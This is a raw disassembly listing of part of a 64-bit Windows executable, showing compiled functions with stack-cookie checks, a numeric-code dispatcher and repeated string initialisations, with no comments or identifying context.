   140003ca6:	48 c7 c1 92 e6 04 00 	mov    $0x4e692,%rcx
   140003cad:	f3 a4                	rep movsb (%rsi),(%rdi)
   140003caf:	ff d0                	call   *%rax
   140003cb1:	c2 27 48             	ret    $0x4827
   140003cb4:	8b 49 f8             	mov    -0x8(%rcx),%ecx
   140003cb7:	48 2b c1             	sub    %rcx,%rax
   140003cba:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003cbe:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003cc2:	77 36                	ja     0x140003cfa
   140003cc4:	e9 7c fd ff ff       	jmp    0x140003a45
   140003cc9:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003cce:	e8 9d 62 00 00       	call   0x140009f70
   140003cd3:	8b c3                	mov    %ebx,%eax
   140003cd5:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140003cd9:	48 33 cc             	xor    %rsp,%rcx
   140003cdc:	e8 8f a6 0b 00       	call   0x1400be370
   140003ce1:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140003ce8:	00 
   140003ce9:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140003ced:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140003cf1:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140003cf5:	49 8b e3             	mov    %r11,%rsp
   140003cf8:	5d                   	pop    %rbp
   140003cf9:	c3                   	ret
   140003cfa:	e8 c1 f9 0d 00       	call   0x1400e36c0
   140003cff:	cc                   	int3
   140003d00:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003d05:	55                   	push   %rbp
   140003d06:	56                   	push   %rsi
   140003d07:	57                   	push   %rdi
   140003d08:	48 8b ec             	mov    %rsp,%rbp
   140003d0b:	48 83 ec 50          	sub    $0x50,%rsp
   140003d0f:	48 8b f2             	mov    %rdx,%rsi
   140003d12:	45 33 db             	xor    %r11d,%r11d
   140003d15:	41 8b db             	mov    %r11d,%ebx
   140003d18:	48 85 c9             	test   %rcx,%rcx
   140003d1b:	0f 94 c3             	sete   %bl
   140003d1e:	48 85 c9             	test   %rcx,%rcx
   140003d21:	75 1e                	jne    0x140003d41
   140003d23:	48 8d 15 8e aa 12 00 	lea    0x12aa8e(%rip),%rdx        # 0x14012e7b8
   140003d2a:	e8 a1 61 00 00       	call   0x140009ed0
   140003d2f:	8b c3                	mov    %ebx,%eax
   140003d31:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003d38:	00 
   140003d39:	48 83 c4 50          	add    $0x50,%rsp
   140003d3d:	5f                   	pop    %rdi
   140003d3e:	5e                   	pop    %rsi
   140003d3f:	5d                   	pop    %rbp
   140003d40:	c3                   	ret
   140003d41:	41 8b db             	mov    %r11d,%ebx
   140003d44:	48 85 f6             	test   %rsi,%rsi
   140003d47:	0f 94 c3             	sete   %bl
   140003d4a:	48 85 f6             	test   %rsi,%rsi
   140003d4d:	75 1e                	jne    0x140003d6d
   140003d4f:	48 8d 15 8a aa 12 00 	lea    0x12aa8a(%rip),%rdx        # 0x14012e7e0
   140003d56:	e8 75 61 00 00       	call   0x140009ed0
   140003d5b:	8b c3                	mov    %ebx,%eax
   140003d5d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003d64:	00 
   140003d65:	48 83 c4 50          	add    $0x50,%rsp
   140003d69:	5f                   	pop    %rdi
   140003d6a:	5e                   	pop    %rsi
   140003d6b:	5d                   	pop    %rbp
   140003d6c:	c3                   	ret
   140003d6d:	48 8b 11             	mov    (%rcx),%rdx
   140003d70:	48 85 d2             	test   %rdx,%rdx
   140003d73:	0f 84 c6 02 00 00    	je     0x14000403f
   140003d79:	8b 42 0c             	mov    0xc(%rdx),%eax
   140003d7c:	ff c8                	dec    %eax
   140003d7e:	81 7a 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rdx)
   140003d85:	0f 85 b4 02 00 00    	jne    0x14000403f
   140003d8b:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003d90:	0f 87 a9 02 00 00    	ja     0x14000403f
   140003d96:	44 8b 49 0c          	mov    0xc(%rcx),%r9d
   140003d9a:	41 8b db             	mov    %r11d,%ebx
   140003d9d:	89 5d e0             	mov    %ebx,-0x20(%rbp)
   140003da0:	44 89 5d e4          	mov    %r11d,-0x1c(%rbp)
   140003da4:	44 89 4d e8          	mov    %r9d,-0x18(%rbp)
   140003da8:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140003dac:	8b 41 08             	mov    0x8(%rcx),%eax
   140003daf:	3d 41 9c 00 00       	cmp    $0x9c41,%eax
   140003db4:	0f 87 7f 01 00 00    	ja     0x140003f39
   140003dba:	0f 84 19 01 00 00    	je     0x140003ed9
   140003dc0:	2d 20 4e 00 00       	sub    $0x4e20,%eax
   140003dc5:	0f 84 a8 00 00 00    	je     0x140003e73
   140003dcb:	83 e8 01             	sub    $0x1,%eax
   140003dce:	74 40                	je     0x140003e10
   140003dd0:	83 e8 01             	sub    $0x1,%eax
   140003dd3:	74 23                	je     0x140003df8
   140003dd5:	3d 1e 4e 00 00       	cmp    $0x4e1e,%eax
   140003dda:	0f 85 74 01 00 00    	jne    0x140003f54
   140003de0:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   140003de4:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003de8:	e8 f3 66 00 00       	call   0x14000a4e0
   140003ded:	44 8b d8             	mov    %eax,%r11d
   140003df0:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140003df3:	e9 1d 01 00 00       	jmp    0x140003f15
   140003df8:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   140003dfc:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003e00:	e8 0b 63 00 00       	call   0x14000a110
   140003e05:	44 8b d8             	mov    %eax,%r11d
   140003e08:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140003e0b:	e9 05 01 00 00       	jmp    0x140003f15
   140003e10:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140003e14:	48 8b 51 38          	mov    0x38(%rcx),%rdx
   140003e18:	48 85 d2             	test   %rdx,%rdx
   140003e1b:	74 36                	je     0x140003e53
   140003e1d:	8b 42 0c             	mov    0xc(%rdx),%eax
   140003e20:	ff c8                	dec    %eax
   140003e22:	81 7a 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rdx)
   140003e29:	75 28                	jne    0x140003e53
   140003e2b:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003e30:	77 21                	ja     0x140003e53
   140003e32:	38 59 48             	cmp    %bl,0x48(%rcx)
   140003e35:	74 0a                	je     0x140003e41
   140003e37:	bb 10 00 00 00       	mov    $0x10,%ebx
   140003e3c:	e9 d4 00 00 00       	jmp    0x140003f15
   140003e41:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140003e45:	48 89 42 48          	mov    %rax,0x48(%rdx)
   140003e49:	bb 50 00 00 00       	mov    $0x50,%ebx
   140003e4e:	e9 c2 00 00 00       	jmp    0x140003f15
   140003e53:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%rbp)
   140003e5a:	4c 8d 05 af aa 12 00 	lea    0x12aaaf(%rip),%r8        # 0x14012e910
   140003e61:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003e65:	e8 a6 b1 00 00       	call   0x14000f010
   140003e6a:	44 8b 5d d0          	mov    -0x30(%rbp),%r11d
   140003e6e:	e9 a2 00 00 00       	jmp    0x140003f15
   140003e73:	4c 8d 41 38          	lea    0x38(%rcx),%r8
   140003e77:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140003e7b:	49 8b 08             	mov    (%r8),%rcx
   140003e7e:	48 85 c9             	test   %rcx,%rcx
   140003e81:	74 39                	je     0x140003ebc
   140003e83:	8b 41 0c             	mov    0xc(%rcx),%eax
   140003e86:	ff c8                	dec    %eax
   140003e88:	81 79 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rcx)
   140003e8f:	75 2b                	jne    0x140003ebc
   140003e91:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003e96:	77 24                	ja     0x140003ebc
   140003e98:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140003e9c:	41 38 58 30          	cmp    %bl,0x30(%r8)
   140003ea0:	74 0d                	je     0x140003eaf
   140003ea2:	e8 79 e2 00 00       	call   0x140012120
   140003ea7:	44 8b d8             	mov    %eax,%r11d
   140003eaa:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140003ead:	eb 66                	jmp    0x140003f15
   140003eaf:	e8 7c d5 00 00       	call   0x140011430
   140003eb4:	44 8b d8             	mov    %eax,%r11d
   140003eb7:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140003eba:	eb 59                	jmp    0x140003f15
   140003ebc:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%rbp)
   140003ec3:	4c 8d 05 6e a9 12 00 	lea    0x12a96e(%rip),%r8        # 0x14012e838
   140003eca:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003ece:	e8 3d b1 00 00       	call   0x14000f010
   140003ed3:	44 8b 5d d0          	mov    -0x30(%rbp),%r11d
   140003ed7:	eb 3c                	jmp    0x140003f15
   140003ed9:	44 0f b6 41 40       	movzbl 0x40(%rcx),%r8d
   140003ede:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140003ee2:	45 85 c9             	test   %r9d,%r9d
   140003ee5:	74 29                	je     0x140003f10
   140003ee7:	41 8b c3             	mov    %r11d,%eax
   140003eea:	41 83 f9 01          	cmp    $0x1,%r9d
   140003eee:	0f 95 c0             	setne  %al
   140003ef1:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140003ef4:	74 1a                	je     0x140003f10
   140003ef6:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003efa:	e8 01 b9 00 00       	call   0x14000f800
   140003eff:	44 8b 5d d0          	mov    -0x30(%rbp),%r11d
   140003f03:	eb 10                	jmp    0x140003f15
   140003f05:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140003f0c:	00 00 00 00 
   140003f10:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140003f15:	45 85 db             	test   %r11d,%r11d
   140003f18:	0f 85 0e 01 00 00    	jne    0x14000402c
   140003f1e:	89 1e                	mov    %ebx,(%rsi)
   140003f20:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140003f23:	89 46 04             	mov    %eax,0x4(%rsi)
   140003f26:	41 8b c3             	mov    %r11d,%eax
   140003f29:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003f30:	00 
   140003f31:	48 83 c4 50          	add    $0x50,%rsp
   140003f35:	5f                   	pop    %rdi
   140003f36:	5e                   	pop    %rsi
   140003f37:	5d                   	pop    %rbp
   140003f38:	c3                   	ret
   140003f39:	2d 42 9c 00 00       	sub    $0x9c42,%eax
   140003f3e:	0f 84 db 00 00 00    	je     0x14000401f
   140003f44:	2d 0e 27 00 00       	sub    $0x270e,%eax
   140003f49:	0f 84 b0 00 00 00    	je     0x140003fff
   140003f4f:	83 f8 01             	cmp    $0x1,%eax
   140003f52:	74 19                	je     0x140003f6d
   140003f54:	41 bb 05 00 00 00    	mov    $0x5,%r11d
   140003f5a:	41 8b c3             	mov    %r11d,%eax
   140003f5d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003f64:	00 
   140003f65:	48 83 c4 50          	add    $0x50,%rsp
   140003f69:	5f                   	pop    %rdi
   140003f6a:	5e                   	pop    %rsi
   140003f6b:	5d                   	pop    %rbp
   140003f6c:	c3                   	ret
   140003f6d:	48 8d 79 38          	lea    0x38(%rcx),%rdi
   140003f71:	4c 8b c7             	mov    %rdi,%r8
   140003f74:	41 8b d1             	mov    %r9d,%edx
   140003f77:	e8 f4 a2 00 00       	call   0x14000e270
   140003f7c:	85 c0                	test   %eax,%eax
   140003f7e:	0f 84 a0 00 00 00    	je     0x140004024
   140003f84:	0f b6 57 03          	movzbl 0x3(%rdi),%edx
   140003f88:	44 0f b6 47 04       	movzbl 0x4(%rdi),%r8d
   140003f8d:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140003f92:	80 3f 01             	cmpb   $0x1,(%rdi)
   140003f95:	75 2a                	jne    0x140003fc1
   140003f97:	41 80 f8 01          	cmp    $0x1,%r8b
   140003f9b:	0f 85 83 00 00 00    	jne    0x140004024
   140003fa1:	bb 24 00 00 00       	mov    $0x24,%ebx
   140003fa6:	89 1e                	mov    %ebx,(%rsi)
   140003fa8:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140003fab:	89 46 04             	mov    %eax,0x4(%rsi)
   140003fae:	41 8b c3             	mov    %r11d,%eax
   140003fb1:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003fb8:	00 
   140003fb9:	48 83 c4 50          	add    $0x50,%rsp
   140003fbd:	5f                   	pop    %rdi
   140003fbe:	5e                   	pop    %rsi
   140003fbf:	5d                   	pop    %rbp
   140003fc0:	c3                   	ret
   140003fc1:	b9 18 00 00 00       	mov    $0x18,%ecx
   140003fc6:	80 fa 01             	cmp    $0x1,%dl
   140003fc9:	b8 24 00 00 00       	mov    $0x24,%eax
   140003fce:	0f 45 c3             	cmovne %ebx,%eax
   140003fd1:	8b d8                	mov    %eax,%ebx
   140003fd3:	41 80 f8 01          	cmp    $0x1,%r8b
   140003fd7:	75 4b                	jne    0x140004024
   140003fd9:	bb 30 00 00 00       	mov    $0x30,%ebx
   140003fde:	41 3a d0             	cmp    %r8b,%dl
   140003fe1:	0f 45 d9             	cmovne %ecx,%ebx
   140003fe4:	89 1e                	mov    %ebx,(%rsi)
   140003fe6:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140003fe9:	89 46 04             	mov    %eax,0x4(%rsi)
   140003fec:	41 8b c3             	mov    %r11d,%eax
   140003fef:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003ff6:	00 
   140003ff7:	48 83 c4 50          	add    $0x50,%rsp
   140003ffb:	5f                   	pop    %rdi
   140003ffc:	5e                   	pop    %rsi
   140003ffd:	5d                   	pop    %rbp
   140003ffe:	c3                   	ret
   140003fff:	bb 40 55 48 8d       	mov    $0x8d485540,%ebx
   140004004:	6c                   	insb   (%dx),(%rdi)
   140004005:	24 a9                	and    $0xa9,%al
   140004007:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   14000400e:	48 c7 44 24 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rsp)
   140004015:	ff ff 
   140004017:	48 89 9c 24 10 01 00 	mov    %rbx,0x110(%rsp)
   14000401e:	00 
   14000401f:	48 8b 05 5a 40 04 00 	mov    0x4405a(%rip),%rax        # 0x140048080
   140004026:	48 33 c4             	xor    %rsp,%rax
   140004029:	48 89 45 47          	mov    %rax,0x47(%rbp)
   14000402d:	48 8d 4d 87          	lea    -0x79(%rbp),%rcx
   140004031:	e8 8a 75 00 00       	call   0x14000b5c0
   140004036:	48 c7 45 9f 0f 00 00 	movq   $0xf,-0x61(%rbp)
   14000403d:	00 
   14000403e:	33 db                	xor    %ebx,%ebx
   140004040:	48 89 5d 97          	mov    %rbx,-0x69(%rbp)
   140004044:	88 5d 87             	mov    %bl,-0x79(%rbp)
   140004047:	44 8d 43 1a          	lea    0x1a(%rbx),%r8d
   14000404b:	48 8d 15 ce c6 02 00 	lea    0x2c6ce(%rip),%rdx        # 0x140030720
   140004052:	48 8d 4d 87          	lea    -0x79(%rbp),%rcx
   140004056:	e8 85 16 00 00       	call   0x1400056e0
   14000405b:	90                   	nop
   14000405c:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140004060:	e8 5b 75 00 00       	call   0x14000b5c0
   140004065:	48 c7 45 bf 0f 00 00 	movq   $0xf,-0x41(%rbp)
   14000406c:	00 
   14000406d:	48 89 5d b7          	mov    %rbx,-0x49(%rbp)
   140004071:	88 5d a7             	mov    %bl,-0x59(%rbp)
   140004074:	44 8d 43 16          	lea    0x16(%rbx),%r8d
   140004078:	48 8d 15 c1 c6 02 00 	lea    0x2c6c1(%rip),%rdx        # 0x140030740
   14000407f:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140004083:	e8 58 16 00 00       	call   0x1400056e0
   140004088:	90                   	nop
   140004089:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000408d:	e8 2e 75 00 00       	call   0x14000b5c0
   140004092:	48 c7 45 df 0f 00 00 	movq   $0xf,-0x21(%rbp)
   140004099:	00 
   14000409a:	48 89 5d d7          	mov    %rbx,-0x29(%rbp)
   14000409e:	88 5d c7             	mov    %bl,-0x39(%rbp)
   1400040a1:	44 8d 43 17          	lea    0x17(%rbx),%r8d
   1400040a5:	48 8d 15 ac c6 02 00 	lea    0x2c6ac(%rip),%rdx        # 0x140030758
   1400040ac:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   1400040b0:	e8 2b 16 00 00       	call   0x1400056e0
   1400040b5:	90                   	nop
   1400040b6:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   1400040ba:	e8 01 75 00 00       	call   0x14000b5c0
   1400040bf:	48 c7 45 ff 0f 00 00 	movq   $0xf,-0x1(%rbp)
   1400040c6:	00 
   1400040c7:	48 89 5d f7          	mov    %rbx,-0x9(%rbp)
   1400040cb:	88 5d e7             	mov    %bl,-0x19(%rbp)
   1400040ce:	44 8d 43 17          	lea    0x17(%rbx),%r8d
   1400040d2:	48 8d 15 97 c6 02 00 	lea    0x2c697(%rip),%rdx        # 0x140030770
   1400040d9:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   1400040dd:	e8 fe 15 00 00       	call   0x1400056e0
   1400040e2:	90                   	nop
   1400040e3:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   1400040e7:	e8 d4 74 00 00       	call   0x14000b5c0
   1400040ec:	48 c7 45 1f 0f 00 00 	movq   $0xf,0x1f(%rbp)
   1400040f3:	00 
   1400040f4:	48 89 5d 17          	mov    %rbx,0x17(%rbp)
   1400040f8:	88 5d 07             	mov    %bl,0x7(%rbp)
   1400040fb:	44 8d 43 1c          	lea    0x1c(%rbx),%r8d
   1400040ff:	48 8d 15 82 c6 02 00 	lea    0x2c682(%rip),%rdx        # 0x140030788
   140004106:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   14000410a:	e8 d1 15 00 00       	call   0x1400056e0
   14000410f:	90                   	nop
   140004110:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   140004114:	e8 a7 74 00 00       	call   0x14000b5c0
   140004119:	48 c7 45 3f 0f 00 00 	movq   $0xf,0x3f(%rbp)
   140004120:	00 
   140004121:	48 89 5d 37          	mov    %rbx,0x37(%rbp)
   140004125:	88 5d 27             	mov    %bl,0x27(%rbp)
   140004128:	44 8d 43 1a          	lea    0x1a(%rbx),%r8d
   14000412c:	48 8d 15 75 c6 02 00 	lea    0x2c675(%rip),%rdx        # 0x1400307a8
   140004133:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   140004137:	e8 a4 15 00 00       	call   0x1400056e0
   14000413c:	90                   	nop
   14000413d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004142:	48 8d 0d 07 53 04 00 	lea    0x45307(%rip),%rcx        # 0x140049450
   140004149:	e8 72 74 00 00       	call   0x14000b5c0
   14000414e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004151:	f3 0f 7f 05 f7 52 04 	movdqu %xmm0,0x452f7(%rip)        # 0x140049450
   140004158:	00 
   140004159:	48 89 1d 00 53 04 00 	mov    %rbx,0x45300(%rip)        # 0x140049460
   140004160:	33 c0                	xor    %eax,%eax
   140004162:	44 0f b6 c8          	movzbl %al,%r9d
   140004166:	4c 8d 45 47          	lea    0x47(%rbp),%r8
   14000416a:	48 8d 55 87          	lea    -0x79(%rbp),%rdx
   14000416e:	48 8d 0d db 52 04 00 	lea    0x452db(%rip),%rcx        # 0x140049450
   140004175:	e8 b6 0e 00 00       	call   0x140005030
   14000417a:	90                   	nop
   14000417b:	4c 8d 0d be 10 00 00 	lea    0x10be(%rip),%r9        # 0x140005240
   140004182:	8d 53 20             	lea    0x20(%rbx),%edx
   140004185:	44 8d 43 06          	lea    0x6(%rbx),%r8d
   140004189:	48 8d 4d 87          	lea    -0x79(%rbp),%rcx
   14000418d:	e8 1a cf 00 00       	call   0x1400110ac
   140004192:	48 8d 0d c7 b1 02 00 	lea    0x2b1c7(%rip),%rcx        # 0x14002f360
   140004199:	e8 b2 d2 00 00       	call   0x140011450
   14000419e:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   1400041a2:	48 33 cc             	xor    %rsp,%rcx
   1400041a5:	e8 56 d3 00 00       	call   0x140011500
   1400041aa:	48 8b 9c 24 10 01 00 	mov    0x110(%rsp),%rbx
   1400041b1:	00 
   1400041b2:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   1400041b9:	5d                   	pop    %rbp
   1400041ba:	c3                   	ret
   1400041bb:	cc                   	int3
   1400041bc:	cc                   	int3
   1400041bd:	cc                   	int3
   1400041be:	cc                   	int3
   1400041bf:	cc                   	int3
   1400041c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400041c4:	48 8d 0d ed 51 04 00 	lea    0x451ed(%rip),%rcx        # 0x1400493b8
   1400041cb:	e8 f0 73 00 00       	call   0x14000b5c0
   1400041d0:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400041d6:	48 c7 05 ef 51 04 00 	movq   $0xf,0x451ef(%rip)        # 0x1400493d0
   1400041dd:	0f 00 00 00 
   1400041e1:	48 8d 15 b0 c2 02 00 	lea    0x2c2b0(%rip),%rdx        # 0x140030498
   1400041e8:	48 c7 05 d5 51 04 00 	movq   $0x0,0x451d5(%rip)        # 0x1400493c8
   1400041ef:	00 00 00 00 
   1400041f3:	48 8d 0d be 51 04 00 	lea    0x451be(%rip),%rcx        # 0x1400493b8
   1400041fa:	c6 05 b7 51 04 00 00 	movb   $0x0,0x451b7(%rip)        # 0x1400493b8
   140004201:	e8 da 14 00 00       	call   0x1400056e0
   140004206:	48 8d 0d d3 b1 02 00 	lea    0x2b1d3(%rip),%rcx        # 0x14002f3e0
   14000420d:	48 83 c4 28          	add    $0x28,%rsp
   140004211:	e9 3a d2 00 00       	jmp    0x140011450
   140004216:	cc                   	int3
   140004217:	cc                   	int3
   140004218:	cc                   	int3
   140004219:	cc                   	int3
   14000421a:	cc                   	int3
   14000421b:	cc                   	int3
   14000421c:	cc                   	int3
   14000421d:	cc                   	int3
   14000421e:	cc                   	int3
   14000421f:	cc                   	int3
   140004220:	40 55                	rex push %rbp
   140004222:	48 8d ac 24 a0 fd ff 	lea    -0x260(%rsp),%rbp
   140004229:	ff 
   14000422a:	48 81 ec 60 03 00 00 	sub    $0x360,%rsp
   140004231:	48 c7 44 24 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rsp)
   140004238:	ff ff 
   14000423a:	48 89 9c 24 70 03 00 	mov    %rbx,0x370(%rsp)
   140004241:	00 
   140004242:	48 8b 05 37 3e 04 00 	mov    0x43e37(%rip),%rax        # 0x140048080
   140004249:	48 33 c4             	xor    %rsp,%rax
   14000424c:	48 89 85 50 02 00 00 	mov    %rax,0x250(%rbp)
   140004253:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004258:	e8 63 73 00 00       	call   0x14000b5c0
   14000425d:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   140004264:	00 00 
   140004266:	33 db                	xor    %ebx,%ebx
   140004268:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000426d:	88 5c 24 30          	mov    %bl,0x30(%rsp)
   140004271:	44 8d 43 09          	lea    0x9(%rbx),%r8d
   140004275:	48 8d 15 8c c2 02 00 	lea    0x2c28c(%rip),%rdx        # 0x140030508
   14000427c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004281:	e8 5a 14 00 00       	call   0x1400056e0
   140004286:	90                   	nop
   140004287:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000428c:	e8 2f 73 00 00       	call   0x14000b5c0
   140004291:	48 c7 44 24 68 0f 00 	movq   $0xf,0x68(%rsp)
   140004298:	00 00 
   14000429a:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   14000429f:	88 5c 24 50          	mov    %bl,0x50(%rsp)
   1400042a3:	44 8d 43 0b          	lea    0xb(%rbx),%r8d
   1400042a7:	48 8d 15 6a c2 02 00 	lea    0x2c26a(%rip),%rdx        # 0x140030518
   1400042ae:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042b3:	e8 28 14 00 00       	call   0x1400056e0
   1400042b8:	90                   	nop
   1400042b9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400042be:	e8 fd 72 00 00       	call   0x14000b5c0
   1400042c3:	48 c7 45 88 0f 00 00 	movq   $0xf,-0x78(%rbp)
   1400042ca:	00 
   1400042cb:	48 89 5d 80          	mov    %rbx,-0x80(%rbp)
   1400042cf:	88 5c 24 70          	mov    %bl,0x70(%rsp)
   1400042d3:	44 8d 43 0c          	lea    0xc(%rbx),%r8d
   1400042d7:	48 8d 15 4a c2 02 00 	lea    0x2c24a(%rip),%rdx        # 0x140030528
   1400042de:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400042e3:	e8 f8 13 00 00       	call   0x1400056e0
   1400042e8:	90                   	nop
   1400042e9:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400042ed:	e8 ce 72 00 00       	call   0x14000b5c0
   1400042f2:	48 c7 45 a8 0f 00 00 	movq   $0xf,-0x58(%rbp)
   1400042f9:	00 
   1400042fa:	48 89 5d a0          	mov    %rbx,-0x60(%rbp)
   1400042fe:	88 5d 90             	mov    %bl,-0x70(%rbp)
   140004301:	44 8d 43 0f          	lea    0xf(%rbx),%r8d
   140004305:	48 8d 15 2c c2 02 00 	lea    0x2c22c(%rip),%rdx        # 0x140030538
   14000430c:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140004310:	e8 cb 13 00 00       	call   0x1400056e0
   140004315:	90                   	nop
   140004316:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   14000431a:	e8 a1 72 00 00       	call   0x14000b5c0
   14000431f:	48 c7 45 c8 0f 00 00 	movq   $0xf,-0x38(%rbp)
   140004326:	00 
   140004327:	48 89 5d c0          	mov    %rbx,-0x40(%rbp)
   14000432b:	88 5d b0             	mov    %bl,-0x50(%rbp)
   14000432e:	44 8d 43 11          	lea    0x11(%rbx),%r8d
   140004332:	48 8d 15 0f c2 02 00 	lea    0x2c20f(%rip),%rdx        # 0x140030548
   140004339:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   14000433d:	e8 9e 13 00 00       	call   0x1400056e0
   140004342:	90                   	nop
   140004343:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004347:	e8 74 72 00 00       	call   0x14000b5c0
   14000434c:	48 c7 45 e8 0f 00 00 	movq   $0xf,-0x18(%rbp)
   140004353:	00 
   140004354:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   140004358:	88 5d d0             	mov    %bl,-0x30(%rbp)
   14000435b:	44 8d 43 0a          	lea    0xa(%rbx),%r8d
   14000435f:	48 8d 15 fa c1 02 00 	lea    0x2c1fa(%rip),%rdx        # 0x140030560
   140004366:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000436a:	e8 71 13 00 00       	call   0x1400056e0
   14000436f:	90                   	nop
   140004370:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004374:	e8 47 72 00 00       	call   0x14000b5c0
   140004379:	48 c7 45 08 0f 00 00 	movq   $0xf,0x8(%rbp)
   140004380:	00 
   140004381:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   140004385:	88 5d f0             	mov    %bl,-0x10(%rbp)
   140004388:	44 8d 43 0b          	lea    0xb(%rbx),%r8d
   14000438c:	48 8d 15 dd c1 02 00 	lea    0x2c1dd(%rip),%rdx        # 0x140030570
   140004393:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004397:	e8 44 13 00 00       	call   0x1400056e0
   14000439c:	90                   	nop
   14000439d:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400043a1:	e8 1a 72 00 00       	call   0x14000b5c0
   1400043a6:	48 c7 45 28 0f 00 00 	movq   $0xf,0x28(%rbp)
   1400043ad:	00 
   1400043ae:	48 89 5d 20          	mov    %rbx,0x20(%rbp)
   1400043b2:	88 5d 10             	mov    %bl,0x10(%rbp)
   1400043b5:	44 8d 43 0c          	lea    0xc(%rbx),%r8d
   1400043b9:	48 8d 15 c0 c1 02 00 	lea    0x2c1c0(%rip),%rdx        # 0x140030580
   1400043c0:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400043c4:	e8 17 13 00 00       	call   0x1400056e0
   1400043c9:	90                   	nop
   1400043ca:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   1400043ce:	e8 ed 71 00 00       	call   0x14000b5c0
   1400043d3:	48 c7 45 48 0f 00 00 	movq   $0xf,0x48(%rbp)
   1400043da:	00 
   1400043db:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   1400043df:	88 5d 30             	mov    %bl,0x30(%rbp)
   1400043e2:	44 8d 43 0b          	lea    0xb(%rbx),%r8d
   1400043e6:	48 8d 15 a3 c1 02 00 	lea    0x2c1a3(%rip),%rdx        # 0x140030590
   1400043ed:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   1400043f1:	e8 ea 12 00 00       	call   0x1400056e0
